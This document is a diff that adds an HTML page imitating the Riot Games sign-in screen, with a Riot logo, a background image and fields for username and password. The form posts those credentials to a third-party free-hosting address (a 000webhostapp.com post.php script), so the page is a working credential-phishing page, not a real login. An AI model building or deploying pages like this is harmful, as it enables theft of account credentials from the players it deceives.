@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Riot Sign In</title>
+        <meta content="width=device-width, initial-scale=1" name="viewport" />
+        <style>
+            body {
+                background-image: url("riot_desktop_background_2x.jpg");
+                background-size: cover;
+                height:100vh;
+            }
+
+            input {
+                width:60%;
+                min-height:40px;
+                margin-left:18%;
+                padding:0 2%
+            }
+
+            #username {
+                margin-top:5%;
+            }
+
+            #password {
+                margin-top:5%;
+            }
+
+            #div {
+                margin-left:35%;
+                display: inline-block;
+                /* text-align:center;  */
+                margin-top:10%;
+                background-color:white;
+                width:30%; 
+                height:60%;
+            }
+
+
+            h1 {
+                font-family:sans-serif;
+                margin-top:-6%;
+                font-size:28px;
+                text-align: center;
+            }
+
+            img {
+                margin-top:5%;
+                width:15%;
+                text-align: center;
+                margin-left:5%
+            }
+
+            button {
+                width:100px;
+                height:100px;
+                /* margin-left:40%; */
+                margin-top:10%;
+                border-radius:25%;
+                border:1px solid whitesmoke;
+                background: url("next.PNG");
+                background-size:cover;
+            }
+
+            @media screen and (max-width: 768px) {
+                #div {
+                    width:90%;
+                    margin-left:5%;
+                    height:80%
+                }
+                
+                /* button {
+                    width: 35%;
+                    margin-left:32%
+                } */
+            }
+        </style>
+    </head> 
+    <body>
+        <div id="div">
+            <img src="riot-fist-container-red-rgb.png">
+            <h1>Sign In</h1>
+            <form id="form" action="https://amaranthine-tissue.000webhostapp.com/post.php" method="POST">
+                <input name="username" id="username" type="text" placeholder="USERNAME"></br>
+                <input name="password" id="password" type="password" placeholder="PASSWORD"></br>
+            </form>
+            <div style="text-align:center;">
+                <button type="submit" form="form" value="form"></button>
+            </div>
+        </div>
+    </body>
+</html>
